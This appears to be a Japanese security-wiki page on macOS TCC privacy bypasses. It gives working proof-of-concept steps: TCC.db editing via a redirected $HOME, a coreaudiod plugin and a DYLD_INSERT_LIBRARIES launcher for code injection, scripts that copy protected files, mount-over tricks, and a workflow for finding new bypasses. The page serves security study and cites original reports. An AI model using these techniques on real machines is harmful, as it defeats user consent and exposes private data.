# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 機能別

### Write Bypass

これは bypass ではなく、TCC の仕組みです: **書き込みからは保護されません**。Terminal に **ユーザーの Desktop を読み取るアクセス権がなくても、Desktop には書き込むことができます**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** は、新しい **file** に追加され、**creators app** にその読み取りアクセスを与えます。

### TCC ClickJacking

**TCC prompt の上にウィンドウを配置**し、ユーザーに気付かれないままそれを**受け入れさせる**ことが可能です。PoC は [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** で確認できます。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker は **任意の名前**（Finder、Google Chrome など）を持つ **apps** を **`Info.plist`** 内に作成し、TCC で保護された場所へのアクセスを要求させることができます。ユーザーは、正規の application がこのアクセスを要求していると考えてしまいます。\
さらに、**Dock から正規の app を削除して fake app を配置する**ことも可能です。ユーザーが fake app（同じ icon を使用可能）をクリックすると、正規の app を呼び出し、TCC permissions を要求し、malware を実行できます。これにより、ユーザーは正規の app がアクセスを要求したと信じてしまいます。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細情報と PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH 経由の access には "Full Disk Access" が付与されていました**。これを無効化するには、リストに表示したうえで無効にする必要があります（リストから削除しても、それらの privileges は削除されません）：<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: デフォルトでは、SSH 経由の access には "Full Disk Access" が付与されていました。これを無効化するには、リストに表示したうえで無効にする必要があります（リストから...](<../../../../../images/image (1077).png>)

ここでは、いくつかの **malwares がこの protection を bypass できた例**を確認できます：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> 現在、SSH を enable にするには **Full Disk Access** が必要です

### Handle extensions - CVE-2022-26767

attribute **`com.apple.macl`** は、**特定の application にそのファイルの読み取り permissions を与えるために** files に付与されます。この attribute は、file を app に対して **drag\&drop** したとき、または user が file を開くために**default application で** **double-click** したときに設定されます。

したがって、user はすべての extensions を処理する **malicious app を register** し、Launch Services を呼び出して任意の file を**open** させることができます（その結果、malicious file に読み取り access が付与されます）。

### iCloud

entitlement **`com.apple.private.icloud-account-access`** により、**iCloud tokens を提供する** **`com.apple.iCloudHelper`** XPC service と通信できます。

**iMovie** と **Garageband** にはこの entitlement と、それを可能にするその他の entitlement がありました。

その entitlement から **icloud tokens を取得する** exploit の詳細については、次の talk を確認してください：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission を持つ app は、**他の Apps を control** できます。つまり、**他の Apps に付与された permissions を abuse** できる可能性があります。

Apple Scripts の詳細については、次を確認してください：


{{#ref}}
macos-apple-scripts.md
{{#endref}}

たとえば、ある App が **`iTerm` に対する Automation permission** を持っている場合、この例では **`Terminal`** が iTerm に access できます：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA を持たない Terminal は、FDA を持つ iTerm を呼び出し、それを使用して actions を実行できます：
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder経由

または、AppがFinderへのアクセス権を持っている場合、次のようなscriptを実行できます。
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Appごとの挙動

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland の **tccd daemon** は、**`HOME`** **env** 変数を使用して、次の場所にある TCC users database にアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange の投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)によると、また TCC daemon は現在のユーザーの domain 内で `launchd` 経由で実行されているため、そこに渡される **すべての環境変数を制御**することが可能です。\
そのため、**攻撃者は `launchctl` で `$HOME` 環境**変数を **制御された** **ディレクトリ**に設定し、**TCC** daemon を再起動したうえで、**TCC database を直接変更**し、エンドユーザーに一度も prompt を表示させることなく、自身に利用可能な **すべての TCC entitlement** を付与できました。<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes は TCC で保護された場所にアクセスできましたが、note を作成すると、これは **保護されていない場所に作成されます**。そのため、Notes に保護されたファイルを note にコピーさせ（つまり保護されていない場所にコピーさせ）、そのファイルにアクセスできました。

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

ライブラリ `libsecurity_translocate` を使用するバイナリ `/usr/libexec/lsd` には、**nullfs** mount を作成できる entitlement `com.apple.private.nullfs_allow` と、すべてのファイルにアクセスできる **`kTCCServiceSystemPolicyAllFiles`** を持つ entitlement `com.apple.private.tcc.allow` が付与されていました。

"Library" に quarantine attribute を追加し、**`com.apple.security.translocation`** XPC service を呼び出すと、Library が **`$TMPDIR/AppTranslocation/d/d/Library`** に map され、Library 内のすべての documents に **アクセス**できました。

### CVE-2024-44131 - FileProvider symlink race

ファイル操作を **privileged helper**（ここでは **`fileproviderd`** / **`Files.app`**）に委譲する Apps は、ユーザーに代わって items をコピーまたは移動するため、copy は caller ではなく helper の privileges で実行されます。

Jamf Threat Labs は、操作前に実行される symlink validation が **race** 可能であることを示しました。**最後**の path component（チェック対象）に symlink を配置する代わりに、copy が開始された**後**に、attacker が path 内の**中間** directory を置き換えます。すると privileged helper は attacker が制御する link に従い、prompt を一度も表示せずに TCC で保護された locations を読み書きします。<sup>[7]</sup>

path 内で random UUID によって保護されて**いない** directories（例: `~/Library/Mobile Documents/com~apple~CloudDocs`）は、attacker が race に使用する完全な path を予測できるため、最も容易な targets です。

> [!TIP]
> これは探すべき generic pattern です: **path を複数回解決する privileged process**（check-then-use、または source と destination を別々に解決する `rename()` / `copyfile()`）は、path の途中にある directory を置き換えることで race できます。実際にこの window を閉じられるのは、`O_NOFOLLOW_ANY`、すでに open された directory FD に対する `openat()`、または `realpath()` + 再 validation だけです。

詳しくは[**Jamf Threat Labs の writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)を参照してください。<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` は `SQLITE_ENABLE_SQLLOG` を有効にして build でき、environment variables によって動作する logging hook が追加されます（[upstream の `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）。<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **open されたすべての database** について、**database file の copy** と SQL statements の log が `path` に書き込まれます（directory は事前に存在している必要があります）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB が open / attach されるたびに、既存の file を再利用せず **fresh copy** を作成します。
- **`SQLITE_SQLLOG_CONDITIONAL`** – main DB の隣に `<database>-sqllog` file が存在する場合にのみ connection を log します。

この variable を、**FDA** を持ち SQLite databases を open する process に inject できれば、保護された databases があなたの制御する directory に**コピー**されます。destination filename は attacker-controlled data から導出されるため、destination に配置した symlink によって、同じ primitive を target process の privileges での **arbitrary file write** に変えることができます。

### **SQLITE_AUTO_TRACE**

environment variable **`SQLITE_AUTO_TRACE`** が set されていると、library **`libsqlite3.dylib`** はすべての SQL queries の **logging** を開始します。多くの applications がこの library を使用していたため、それらの SQLite queries をすべて log できました。

複数の Apple applications が、この library を使用して TCC で保護された information にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes の探索

前の2つの項目は、同じ汎用的な technique の実例です。そのため、さらに探す価値があります。**TCC-privileged app にロードされる frameworks は、debug/logging 用の environment variables を公開していることが多く、それによって process が caller-controlled path にファイルを作成します**。

見つけるための workflow:

1. FDA またはその他の有用な TCC permission（`Music`、`TV`、`Terminal`、MDM agents...）を持つ target を選び、リンクしている frameworks を一覧表示します（`otool -L`、`vmmap`）。
2. それらの frameworks から `getenv` strings を grep します: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`
3. `launchctl setenv NAME /path/you/control` で候補の variables を設定し、app を起動して、`fs_usage -w -f filesys <pid>` または `sudo fs_usage | grep <path>` で filesystem 上の動作を監視します。
4. process があなたの directory 内にファイルを**作成または rename**する場合、write primitive を得たことになります。destination を symlink に向ける（または上記の CVE-2024-44131 のように intermediate directory と race する）ことで、`~/Library/Application Support/com.apple.TCC/TCC.db` に redirect できます。

> [!TIP]
> これには2つの制限があります。まず、**`DYLD_*` variables は hardened-runtime binaries では無視されます**。ただし app が [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（「dynamic linker environment variables の影響を app が受ける可能性があるかどうかを示す Boolean value。この variables は app の process への code injection に使用できます」）を備えている場合を除きます。詳しくは [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) も参照してください。次に、Apple は報告された個々の framework debug variables を削除します。そのため、ある macOS release で動作した variable が、次の release ではなくなっていることがよくあります。設定後に app が何も表示せず起動を拒否する場合、その variable はすでに filter されたものとして扱ってください。

linker variables を使った同等の trick については、[macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を参照してください。

### Apple Remote Desktop

root でこの service を有効化すると、**ARD agent は full disk access を持つことになり**、その後 user がそれを悪用して新しい **TCC user database** を copy できる可能性があります。

## By **NFSHomeDirectory**

TCC は、user 固有の resources への access を制御するため、user の HOME folder 内にある database、**$HOME/Library/Application Support/com.apple.TCC/TCC.db** を使用します。\
したがって、user が異なる folder を指す `$HOME` env variable を使って TCC を restart できれば、**/Library/Application Support/com.apple.TCC/TCC.db** に新しい TCC database を作成し、TCC をだまして任意の app に任意の TCC permission を付与させることができます。

> [!TIP]
> Apple は、user profile に保存されている **`NFSHomeDirectory`** attribute の値を **`$HOME`** の値として使用することに注意してください。そのため、この値を変更する permission（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つ application を compromise できれば、この option を TCC bypass に**weaponize**できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**first POC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して、user の **HOME** folder を変更します。

1. target app 用の _csreq_ blob を取得します。
2. 必要な access と _csreq_ blob を含む fake _TCC.db_ file を plant します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) を使用して user の Directory Services entry を export します。
4. Directory Services entry を変更して、user の home directory を変更します。
5. 変更した Directory Services entry を [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) で import します。
6. user の _tccd_ を stop し、process を reboot します。

2つ目の POC では、`kTCCServiceSystemPolicySysAdminFiles` を value とする `com.apple.private.tcc.allow` を持つ **`/usr/libexec/configd`** を使用しました。\
**`configd`** は **`-t`** option を使って実行でき、attacker は **custom Bundle を load**するよう指定できました。そのため、この exploit は user の home directory を変更する **`dsexport`** および **`dsimport`** method を、**`configd` code injection** に置き換えます。

詳細については [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) を確認してください。<sup>[13]</sup>

## By process injection

process 内に code を inject し、その TCC privileges を abuse する technique は複数あります:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

さらに、TCC bypass で最もよく見つかる process injection は、**plugins (load library)** 経由のものです。\
Plugins は通常 libraries または plist の形式をした追加 code で、**main application によって load され**、その context 下で実行されます。したがって、main application が granted permissions または entitlements 経由で TCC restricted files に access できる場合、**custom code も同じ access を持つ**ことになります。

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application は **`kTCCServiceSystemPolicySysAdminFiles`** entitlement を持ち、拡張子 **`.daplug`** の plugins を load し、**hardened** runtime を使用していませんでした。

この CVE を weaponize するには、TCC bypass のために **users TCC database を take over**できるよう、（前述の entitlement を abuse して）**`NFSHomeDirectory`** を**変更**します。

詳細については [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) を確認してください。<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary は、`com.apple.security.cs.disable-library-validation` および `com.apple.private.tcc.manager` entitlements を持っていました。前者は **code injection を可能にし**、後者は **TCC を manage する access**を与えます。

この binary は `/Library/Audio/Plug-Ins/HAL` folder から **third party plug-ins** を load できました。そのため、次の PoC により **plugin を load して TCC permissions を abuse**することが可能でした:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) を確認してください。<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O 経由でカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`（SIP の制限対象外）にある **これらのプラグイン** をプロセス内にロードします。

そこに common **constructor** を備えたライブラリを保存するだけで、**code を inject** できます。

複数の Apple アプリケーションがこの影響を受けました。

### Firefox

Firefox アプリケーションには、`com.apple.security.cs.disable-library-validation` および `com.apple.security.cs.allow-dyld-environment-variables` の entitlements がありました。<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
この方法を簡単に exploit する詳しい情報については、[**original report を確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[16]</sup>

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には **`com.apple.private.tcc.allow`** および **`com.apple.security.get-task-allow`** の entitlements が付与されており、プロセス内に code を inject して TCC privileges を使用することが可能でした。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** および **`com.apple.security.cs.disable-library-validation`** の entitlements が付与されていたため、これを abuse して、カメラによる recording など、Telegram の permissions に **get access** することが可能でした。[**writeup に payload があります**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[17]</sup>

env variable を使用して library を load する方法に注目してください。この library を inject するために **custom plist** が作成され、これを launch するために **`launchctl`** が使用されました:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open による invocation

sandboxed の状態でも **`open`** を invocation することが可能です。

### Terminal Scripts

特に技術者が使用するコンピューターでは、Terminal に **Full Disk Access (FDA)** を付与することは非常によくあります。また、それを利用して **`.terminal`** scripts を invocation することも可能です。

**`.terminal`** scripts は、実行する command を **`CommandString`** key に含む、次のような plist files です:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp などの場所にターミナルスクリプトを書き込み、次のようなコマンドで起動できます:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（権限のないユーザーも含む）は、Time Machine snapshot を作成してマウントし、その snapshot 内の**すべてのファイルにアクセス**できます。\
必要な**唯一の権限**は、使用するアプリケーション（`Terminal` など）に**Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることです。この権限は管理者によって付与される必要があります。<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
より詳細な説明は、[**original reportで確認できます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

TCC DB fileが保護されていた場合でも、ディレクトリに新しいTCC.db fileを**mount overする**ことが可能でした:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit**は[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)で確認できます。

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)で説明されているように、このCVEは`diskarbitrationd`を悪用しました。<sup>[18]</sup>

公開されている`DiskArbitration` frameworkの`DADiskMountWithArgumentsCommon`関数がsecurity checksを実行していました。しかし、`diskarbitrationd`を直接呼び出すことでこれをbypassでき、その結果、パス内で`../`要素やsymlinksを使用できました。

これにより、攻撃者は任意の場所に任意のmountを実行できました。これには、`diskarbitrationd`が持つentitlement `com.apple.private.security.storage-exempt.heritable`により、TCC database上へのmountも含まれます。

### asr

**`/usr/sbin/asr`** toolを使用すると、ディスク全体をcopyして別の場所にmountし、TCC protectionsをbypassできました。

### CVE-2022-22655 - Location Services

Location Servicesは、他のservicesのようにTCC databaseには**保存されません**。これは`locationd`によって管理されており、`locationd`は独自のallow-listを**`/var/db/locationd/clients.plist`**に保持しています。<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
各エントリはクライアント（bundle ID または実行可能ファイルのパス）をキーとしており、`Authorized`、`BundleId`、`Executable`、`Registered` などのフィールドを持ちます。

`clients.plist` ファイル自体は Sandbox/TCC によって保護されており、root であっても編集できませんでした。しかし、**`/var/db/locationd/` ディレクトリは mount に対して保護されていませんでした**。そのため、root として実行される attacker は、独自の `clients.plist`（自身のバイナリを `Authorized` としてマークしたもの）を含む disk image を作成し、それをディレクトリに over mount してから `locationd` を再起動することで、偽造した allow-list を有効にできました。<sup>[5]</sup>

> [!TIP]
> これは上記の `hdiutil`/`mount` TCC bypasses と同じパターンです。*ファイル* は保護されていますが、そのファイルが存在する *ディレクトリ* は保護されていないため、ファイルではなくディレクトリ全体を置き換えます。

## startup apps 経由


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep 経由

複数のケースで、ファイルがメールアドレス、電話番号、メッセージなどの機密情報を保護されていない場所に保存していることがあります（これは Apple における vulnerability とみなされます）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これは現在では機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) を使用する別の方法:<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
